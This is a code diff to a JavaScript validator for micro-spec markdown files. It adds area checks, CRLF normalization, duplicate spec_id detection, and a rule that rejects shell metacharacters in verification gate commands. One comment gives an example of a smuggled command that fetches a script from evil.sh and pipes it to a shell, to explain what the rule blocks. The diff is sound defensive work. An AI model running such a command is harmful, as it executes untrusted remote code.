@@ -5,7 +5,7 @@
  * every spec under `micro-specs/<area>/`. A spec is any `*.md` inside an area subfolder;
  * top-level `micro-specs/*.md` (README, GLOBAL_CONTEXT) are governance docs and exempt.
  *
- * Validated per spec: the Micro-Spec Metadata Schema from `Instructions_MircroSpecsCreation.md`
+ * Validated per spec: the Micro-Spec Metadata Schema from `Instructions_MicroSpecsCreation.md`
  * (required keys, status/risk_class enums, spec_id shape, real last_reviewed date, non-empty
  * scope lists), that `related_docs` resolve on disk, that `related_tests` resolve once a spec is
  * implemented/verified, and that every `verification_gate` names a real command.
@@ -45,6 +45,19 @@ export const RISK_CLASSES = [
   'migrations',
 ];
 
+// Known governance areas (the `<area>` token in MS-<area>-<slug>), mirroring the
+// folder/area table in micro-specs/README.md. A spec_id naming a non-area token
+// is a typo/drift even when its shape is otherwise valid.
+export const AREAS = [
+  'foundation',
+  'platform',
+  'ops',
+  'guest',
+  'data',
+  'integrations',
+  'observability',
+];
+
 // Scope lists that must be present and non-empty (approved_exceptions may be empty).
 const REQUIRED_LISTS = [
   'allowed_blast_radius',
@@ -60,6 +73,9 @@ const SPEC_ID_RE = /^MS-[a-z0-9]+-[a-z0-9]+(?:-[a-z0-9]+)*$/;
 const ISO_DATE_RE = /^\d{4}-\d{2}-\d{2}$/;
 const PNPM_EXEC_TOOLS = /^pnpm\s+(?:-s\s+)?exec\s+(vitest|playwright|prettier|eslint|tsc)\b/;
 const PNPM_SCRIPT_RE = /^pnpm\s+(?:run\s+)?([A-Za-z0-9:_-]+)\b/;
+// Shell control operators that would let a "gate" smuggle a second command
+// (e.g. `pnpm lint && curl evil.sh | sh`). A real gate is a single command. (#12)
+const SHELL_METACHAR_RE = /[;&|`]|\$\(/;
 
 function stripQuotes(value) {
   if (value.length >= 2) {
@@ -80,7 +96,10 @@ function stripQuotes(value) {
 export function parseFrontmatter(content) {
   if (typeof content !== 'string') return null;
   const text = content.charCodeAt(0) === 0xfeff ? content.slice(1) : content;
-  const lines = text.split('\n');
+  // Normalize CRLF/CR first: a Windows-saved spec would otherwise leave a trailing
+  // \r on every `key: value` line, fail the kv regex, and parse to empty
+  // frontmatter — producing a flood of misleading "missing key" errors. (#6)
+  const lines = text.replace(/\r\n?/g, '\n').split('\n');
   if (lines[0]?.trim() !== '---') return null;
 
   let end = -1;
@@ -133,6 +152,9 @@ export function isGateRecognized(gate, knownScripts) {
   if (typeof gate !== 'string') return false;
   const scripts = new Set(knownScripts ?? []);
   const g = gate.trim();
+  // A real gate is a single command; reject anything chaining/substituting so a
+  // recognized prefix can't smuggle a trailing command. (#12)
+  if (SHELL_METACHAR_RE.test(g)) return false;
   if (PNPM_EXEC_TOOLS.test(g)) return true;
   const script = PNPM_SCRIPT_RE.exec(g);
   if (script && scripts.has(script[1])) return true;
@@ -172,10 +194,21 @@ export function validateSpecContent({ relPath, content, knownScripts, pathExists
       `${relPath}: invalid risk_class "${data.risk_class}" (expected one of: ${RISK_CLASSES.join(', ')}).`,
     );
   }
-  if ('spec_id' in data && !SPEC_ID_RE.test(asScalar('spec_id') ?? '')) {
-    errors.push(
-      `${relPath}: invalid spec_id "${data.spec_id}" (expected MS-<area>-<slug>, lowercase).`,
-    );
+  if ('spec_id' in data) {
+    const specId = asScalar('spec_id') ?? '';
+    if (!SPEC_ID_RE.test(specId)) {
+      errors.push(
+        `${relPath}: invalid spec_id "${data.spec_id}" (expected MS-<area>-<slug>, lowercase).`,
+      );
+    } else {
+      // Shape is valid; the <area> token must also be a real governance area. (#12)
+      const area = specId.split('-')[1];
+      if (!AREAS.includes(area)) {
+        errors.push(
+          `${relPath}: spec_id area "${area}" is not a known area (expected one of: ${AREAS.join(', ')}).`,
+        );
+      }
+    }
   }
   if ('owner' in data && (typeof data.owner !== 'string' || data.owner.trim() === '')) {
     errors.push(`${relPath}: "owner" must be a non-empty string.`);
@@ -337,12 +370,29 @@ export function runCheck(repoRoot) {
 
   const specFiles = collectSpecFiles(microSpecsDir);
   const pathExists = (p) => pathExistsInRepo(repoRoot, p);
+  const specIdToPaths = new Map();
   for (const file of specFiles) {
     const relPath = path.relative(repoRoot, file).split(path.sep).join('/');
     const content = fs.readFileSync(file, 'utf8');
     const result = validateSpecContent({ relPath, content, knownScripts, pathExists });
     errors.push(...result.errors);
     warnings.push(...result.warnings);
+
+    // Track spec_id across the corpus: it is the primary key for cross-spec
+    // tooling, so duplicates must fail the build. (#12)
+    const parsed = parseFrontmatter(content);
+    const specId = parsed && typeof parsed.data.spec_id === 'string' ? parsed.data.spec_id : null;
+    if (specId) {
+      const seen = specIdToPaths.get(specId) ?? [];
+      seen.push(relPath);
+      specIdToPaths.set(specId, seen);
+    }
+  }
+
+  for (const [specId, paths] of specIdToPaths) {
+    if (paths.length > 1) {
+      errors.push(`duplicate spec_id "${specId}" used by: ${paths.slice().sort().join(', ')}`);
+    }
   }
 
   return { ok: errors.length === 0, errors, warnings, specCount: specFiles.length };
